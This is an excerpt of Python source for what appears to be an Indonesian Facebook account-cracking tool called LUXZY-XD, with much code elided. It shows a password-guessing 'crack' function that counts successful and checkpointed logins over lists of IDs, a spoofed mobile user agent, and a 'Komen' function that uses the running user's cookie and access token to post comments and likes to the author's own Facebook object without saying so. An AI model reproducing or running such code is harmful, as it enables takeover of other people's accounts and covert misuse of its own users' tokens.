...
for xd in range(10000):
    ...
    l='Chrome/103.0.5060.71 Mobile Safari/537.36'
...
[green]   ___ ___ ___ __  __ ___ _   _ __  __    
[green]   | _ \ _ \ __|  \/  |_ _| | | |  \/  |
[yellow]   |  _/   / _|| |\/| || || |_| | |\/| |
[yellow]   |_| |_|_\___|_|  |_|___|\___/|_|  |_|
             [bold white]Made By [bold red]LUXZY-XD[cyan] Modder Official[bold white]""",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]LOGO BANNER [bold red]• [yellow]• [bold green]•",subtitle=f"[bold green]• [bold yellow]• [bold red]• [bold white]Version [bold green]0.1[/] [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
...
def Komen(cookie, token):
    with requests.Session() as r: # Kagak Usah Di Ganti, Anggap Saja Sebagai Tanda Terimakasih :V
        ...
        response = r.post('https://graph.facebook.com/111419311758640/comments/?message={}&access_token={}'.format(text, token)).text # Jangan Di Ganti!
        response9 = r.post('https://graph.facebook.com/111419311758640/likes?summary=true&access_token={}'.format(token)).text # Jangan Di Ganti!
...
def login_lagi334():
	try:
		...
		print(f'{x}[{h}•{x}]{h} |LOGIN SUCCESSFUL| python LUXZY-XD.py {x} ');time.sleep(1)
		exit()
	except Exception as e:
...
#		keyx()
	...
	urut.append(panel(f'[cyan]Ip       : {ip}\nTanggal  : {tgl} {bln} {thn}\nAuthor   : Lux-XD',width=34,padding=(0,2),title=f"[cyan]• Information •[/]",style=f"{color_table}"))
	wa.print(Columns(urut))
	cetak(panel(f'\t        [white][bold green]ANDA ADALAH USER PREMIUM',width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold white]STATUS ANDA [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
	print(f'{b}╭────────────────────────────────────────────────────────────────────╮')
...
def setting():
	...
	print(f'{b}│     [{b}03]. {b}mbasic.facebook.com | [4]  b-api.facebook.com (off)      │')
	print(f'{b}╰────────────────────────────────────────────────────────────────────╯')
...
def crack(idf,pwv):
	...
	fff = '%'
	prog.update(des,description=f' LUXZY-XD [deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
